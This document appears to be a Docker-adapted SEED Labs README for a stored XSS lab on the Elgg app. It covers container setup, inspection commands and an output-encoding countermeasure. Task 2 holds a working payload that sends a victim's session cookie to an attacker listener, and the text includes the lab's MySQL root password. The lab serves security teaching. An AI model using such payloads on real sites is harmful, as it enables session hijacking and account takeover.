# Lab 02 — Cross-Site Scripting (XSS) Attack Lab

**Implementation Type**: Official SEED source adapted for Docker

Official lab manual: https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/
Textbook: Chapter 11 — Cross-Site Scripting Attack (*Computer & Internet Security*, 2nd Ed., Prof. Wenliang Du)
Lecture Sync Sitemap: [SEED Lecture & Reference Sitemap](../../docs/lectures-and-references.md#3-lab-02--cross-site-scripting-xss)
CWE Reference: [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

For authorized educational use only.

> **HOST BROWSER ROUTING NOTICE**: Access the application in host browsers via `http://localhost:10081` (or `http://www.seed-server.com:10081` if `127.0.0.1 www.seed-server.com` is in your host hosts file). Do not use internal container IP `10.9.0.5` directly in host browsers.  
> **CONTAINER COMMAND FALLBACKS**: If `bash` is missing: `docker exec -it elgg-10.9.0.5 sh`. If `ip` is missing: `hostname -i`. If `ss` is missing: `netstat -tlnp`.

---

## Security Concept

Cross-Site Scripting (XSS) occurs when a web application stores or reflects user-supplied input back to a browser without sanitizing it. The browser treats the input as executable JavaScript, running code in the context of the victim user's session.

There are two main types:
- Stored (Persistent) XSS — malicious script is saved in the database and executes every time another user views the infected page
- Reflected XSS — malicious script is embedded in a URL and executes once when the victim clicks the link

This lab focuses on stored XSS using the Elgg social network application.

Example of the flaw:

```php
// Attacker saves this into their "About Me" profile field:
// <script>alert(document.cookie)</script>

// The PHP code stores it raw in the database and later echoes it without escaping:
echo $row['profile_about'];
// Browser receives: <script>alert(document.cookie)</script>
// Browser executes it in the context of whoever views the profile
```

---

## Container Architecture

```
HOST MACHINE
  |
  | Hosts file: www.seed-server.com -> 10.9.0.5
  | Port mapping: localhost:10081   -> container:80
  |
  Docker Bridge Network: net-10.9.0.0-xss  (10.9.0.0/24)
    |
    +---- elgg-10.9.0.5       (Apache + PHP + Elgg social network app)
    |         |
    |         | MySQL connection to 10.9.0.6:3306
    |         |
    +---- mysql-10.9.0.6-xss  (MySQL 8.0 + elgg database with user profiles)
```

Attack flow:
```
Samy (attacker) logs in -> edits "About Me" -> saves XSS payload to database
Alice (victim) logs in  -> views Samy's profile -> browser loads stored script
Browser executes script -> reads Alice's session cookie or performs actions as Alice
```

---

## Layer 1 — Docker Commands (host terminal)

### Start the Lab

```bash
cd labs/02-xss

# Build images and start containers
docker compose up -d --build

# image_www/Dockerfile  -> Apache + PHP + Elgg social network app
# image_mysql/Dockerfile -> MySQL 8.0 + elgg database with user profiles
```

```powershell
# Windows PowerShell equivalent
cd labs\02-xss
docker compose up -d --build
```

### Verify Containers

```bash
docker compose ps

# NAME                  IMAGE                      STATUS    PORTS
# elgg-10.9.0.5         seed-image-www-xss-elgg    Up        0.0.0.0:10081->80/tcp
# mysql-10.9.0.6-xss    seed-image-mysql-xss-elgg  Up        3306/tcp
```

### Inspect Network

```bash
docker network inspect net-10.9.0.0-xss

# Confirm container IPs:
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' elgg-10.9.0.5
# Output: 10.9.0.5
```

### Watch Logs from Host

```bash
# Stream Apache logs while performing attacks in browser
docker compose logs -f elgg

# View MySQL logs
docker compose logs -f mysql
```

---

## Layer 2 — Linux Commands (inside the container)

### Open Bash Shell Inside the Web Container

```bash
docker exec -it elgg-10.9.0.5 bash
```

Prompt changes:
```
Before: PS C:\>  OR  user@host:~$
After:  root@elgg-10.9.0.5:/#
```

### Establish Identity and Network Context

```bash
whoami
# root

hostname
# elgg-10.9.0.5

ip addr show
# eth0: 10.9.0.5/24
```

### Inspect Application Files

```bash
cd /var/www/html
ls -la
cat index.php

# Find where profile data is output without escaping (the XSS sink)
grep -n "profile_about\|echo\|print" index.php

# Find where input is stored without sanitization (the XSS source)
grep -n "INSERT\|UPDATE\|profile" index.php
```

### Inspect Processes and Apache Config

```bash
ps aux
# apache2 master (root) + workers (www-data)

cat /etc/apache2/sites-enabled/000-default.conf
ss -tlnp
# 0.0.0.0:80
```

### View Real-Time Requests

```bash
# Watch every HTTP request arrive as you browse the app
tail -f /var/log/apache2/access.log
# Ctrl+C to stop
```

### Test MySQL Connectivity

```bash
mysql -h 10.9.0.6 -u root -pseedubuntu elgg

SHOW TABLES;
SELECT username, profile_about FROM users;
EXIT;
```

### Exit Container

```bash
exit
```

Prompt returns:
```
Before: root@elgg-10.9.0.5:/#
After:  PS C:\>  OR  user@host:~$
```

### Enter MySQL Container

```bash
docker exec -it mysql-10.9.0.6-xss bash
mysql -u root -pseedubuntu
USE elgg;
SELECT username, profile_about FROM users;
EXIT;
exit
```

---

## Layer 3 — Security Tasks

### Configure Hostname

Windows (PowerShell as Administrator):
```powershell
Add-Content "C:\Windows\System32\drivers\etc\hosts" "10.9.0.5   www.seed-server.com"
```

Linux / WSL2:
```bash
echo "10.9.0.5   www.seed-server.com" | sudo tee -a /etc/hosts
```

### Access the Application

```
http://localhost:10081
http://www.seed-server.com   (with hosts file)
```

### Task 1 — Post a Malicious Message (Basic XSS)

Log in as Samy. In the "Update Profile About Me" section, enter:

```html
<script>alert('XSS by Samy');</script>
```

Save. Now log in as Alice. View Samy's profile. The browser executes the script.

Verify the payload is stored in the database:

```bash
docker exec -it mysql-10.9.0.6-xss mysql -u root -pseedubuntu \
  -e "SELECT username, profile_about FROM elgg.users WHERE username='samy';"
```

### Task 2 — Steal Session Cookie

Update Samy's profile with:

```html
<script>
document.write('<img src="http://10.9.0.105:5555?cookie=' + escape(document.cookie) + '">');
</script>
```

This sends Alice's session cookie to the attacker's listener when she views Samy's profile.

### Task 3 — Self-Propagating XSS (Samy Worm)

Update Samy's profile with a worm payload that adds itself to every profile that views it. See official lab manual for the full payload.

### Task 4 — Countermeasure: Output Encoding

The Secure section of the app uses `htmlspecialchars()` to escape output. Try the same payload:

```php
// Secure version:
echo htmlspecialchars($row['profile_about'], ENT_QUOTES, 'UTF-8');
// Browser receives: &lt;script&gt;alert('XSS')&lt;/script&gt;
// Browser displays it as text, does not execute it
```

Modify the app code, copy it back, and verify:

```bash
# Copy source to host, edit, copy back
docker cp elgg-10.9.0.5:/var/www/html/index.php ./index.php
# Edit the echo line to use htmlspecialchars()
docker cp ./index.php elgg-10.9.0.5:/var/www/html/index.php
```

---

## Stop and Reset

```bash
docker compose down          # stop (profile payloads preserved in DB)
docker compose down -v       # wipe database, restore original profiles
docker compose up -d --build # rebuild
```

```powershell
# Windows
docker compose down -v
docker compose up -d --build
```

---

## Key File Locations

| File | Container | Path |
|------|-----------|------|
| PHP application | `elgg-10.9.0.5` | `/var/www/html/index.php` |
| Apache access log | `elgg-10.9.0.5` | `/var/log/apache2/access.log` |
| Apache error log | `elgg-10.9.0.5` | `/var/log/apache2/error.log` |
| Apache config | `elgg-10.9.0.5` | `/etc/apache2/sites-enabled/000-default.conf` |
| DB init script | `mysql-10.9.0.6-xss` | `/docker-entrypoint-initdb.d/elgg.sql` |
